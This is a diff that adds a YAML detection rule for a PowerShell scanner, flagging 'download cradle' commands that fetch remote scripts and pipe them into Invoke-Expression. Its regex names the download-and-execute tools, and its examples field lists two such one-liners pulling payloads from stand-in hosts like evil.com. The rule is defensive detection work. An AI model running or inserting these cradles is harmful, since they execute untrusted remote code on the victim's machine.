@@ -1,0 +1,30 @@
+# PowerShell Pattern: Download Cradle
+# Detects common download cradle patterns
+
+id: PS-003
+name: Download Cradle Pattern
+description: |
+  Detects PowerShell download cradle patterns used to download and execute remote code.
+  Common patterns include DownloadString, DownloadFile, and Invoke-WebRequest followed
+  by execution. These are frequently used in fileless malware attacks.
+languages:
+  - powershell
+detection_type: regex
+detection_logic: '(?i)(DownloadString|DownloadFile|Invoke-WebRequest|iwr|wget|curl).*\|.*(?:Invoke-Expression|IEX)'
+severity: Critical
+mitre_technique: T1105
+confidence: 0.95
+category: command_injection
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-15"
+  references:
+    - "https://attack.mitre.org/techniques/T1105/"
+  tags:
+    - powershell
+    - download
+    - remote-execution
+  examples:
+    - "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+    - "Invoke-WebRequest http://malicious.com/script.ps1 | IEX"
